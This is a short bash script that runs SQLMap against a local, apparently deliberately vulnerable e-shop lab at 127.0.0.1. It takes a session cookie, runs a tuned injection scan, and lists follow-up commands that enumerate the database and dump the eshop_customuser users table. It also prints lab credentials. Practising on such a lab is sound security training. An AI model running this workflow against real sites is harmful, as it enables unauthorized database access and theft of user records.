#!/bin/bash
# Quick SQLMap test script for the vulnerable e-shop

echo "=== SQLMap Quick Test for E-Shop ==="
echo ""
echo "IMPORTANT: You need to be logged in first!"
echo "1. Go to http://127.0.0.1:8000/login/"
echo "2. Login with admin/admin123 or test/test123"
echo "3. Get your sessionid from browser cookies"
echo ""
read -p "Enter your sessionid cookie value: " SESSION_ID

if [ -z "$SESSION_ID" ]; then
    echo "Error: Session ID is required!"
    exit 1
fi

TARGET="http://127.0.0.1:8000/?q=test"

echo ""
echo "[*] Testing URL: $TARGET"
echo "[*] Using session: $SESSION_ID"
echo ""

# Basic test with optimized settings for this specific vulnerability
echo "[*] Running SQLMap..."
sqlmap -u "$TARGET" \
       --cookie="sessionid=$SESSION_ID" \
       --batch \
       --smart \
       --threads=10 \
       --risk=2 \
       --level=3 \
       --dbms=SQLite \
       --technique=BU \
       --tamper=space2comment \
       --random-agent

echo ""
echo "[*] If vulnerability found, run these for more info:"
echo "    # Get database name:"
echo "    sqlmap -u \"$TARGET\" --cookie=\"sessionid=$SESSION_ID\" --batch --current-db"
echo ""
echo "    # Get tables:"
echo "    sqlmap -u \"$TARGET\" --cookie=\"sessionid=$SESSION_ID\" --batch --tables"
echo ""
echo "    # Dump users:"
echo "    sqlmap -u \"$TARGET\" --cookie=\"sessionid=$SESSION_ID\" --batch -T eshop_customuser --dump"